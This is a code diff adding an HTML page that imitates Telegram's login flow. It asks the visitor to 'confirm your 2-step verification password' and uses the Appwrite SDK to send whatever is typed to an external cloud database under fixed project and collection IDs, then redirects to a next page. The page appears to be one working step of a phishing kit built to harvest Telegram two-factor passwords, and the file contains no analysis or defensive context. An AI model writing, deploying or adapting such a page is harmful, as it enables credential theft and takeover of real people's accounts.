@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <link rel="stylesheet" href="ttu.css">
+    <style>
+        /* Disable button style */
+        .submit-btn:disabled {
+            background-color:#65aedc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Your password</h2>
+        <p>Please confirm your 2-step verification password.</p>
+        <form id="phone-form">
+            <div class="input-group">
+                <label for="phone-number">Password</label>
+                <input type="text" id="phone-number" required placeholder="Enter password">
+                <button type="submit" class="submit-btn" disabled>&#10140;</button> <!-- Ensure initially disabled -->
+            </div>
+        </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/appwrite@11.0.0"></script>
+
+    <script>
+        // Initialize Appwrite client
+        const client = new Appwrite.Client();
+        const databases = new Appwrite.Databases(client);
+
+        client
+            .setEndpoint('https://cloud.appwrite.io/v1') // Your Appwrite endpoint
+            .setProject('66f1f933003cce932aea'); // Your project ID
+
+        // Get references to the necessary elements
+        const phoneNumberInput = document.getElementById('phone-number');
+        const submitButton = document.querySelector('.submit-btn');
+        
+        // Function to check if input is filled
+        function checkInput() {
+            if (phoneNumberInput.value.length > 0) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        }
+
+        // Initial check
+        checkInput();
+
+        // Add event listener for input change
+        phoneNumberInput.addEventListener('input', checkInput);
+
+        // Handle form submission
+        document.getElementById('phone-form').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+
+            const phoneNumber = phoneNumberInput.value;
+
+            // Disable the submit button and show the spinner
+            submitButton.disabled = true;
+            submitButton.innerHTML = '<div class="spinner"></div>';
+
+            try {
+                // Save the phone number to the Appwrite database
+                const result = await databases.createDocument(
+                    'data', // Your Database ID
+                    '66f1ff2200319d99c15d', // Your Collection ID
+                    'unique()', // Automatically generate a unique ID for the new document
+                    { phone: phoneNumber }
+                );
+
+                console.log('Phone number saved successfully:', result);
+                alert('Phone number saved successfully!');
+                
+                // Open the new page if the phone number is saved successfully
+                window.location.href = 'page3.html';
+            } catch (error) {
+                console.error('Error saving phone number:', error);
+                alert('Failed to save phone number.');
+            } finally {
+                // Re-enable the submit button and revert its content
+                submitButton.disabled = false;
+                submitButton.innerHTML = '&#10140;';
+            }
+        });
+    </script>
+</body>
+</html>
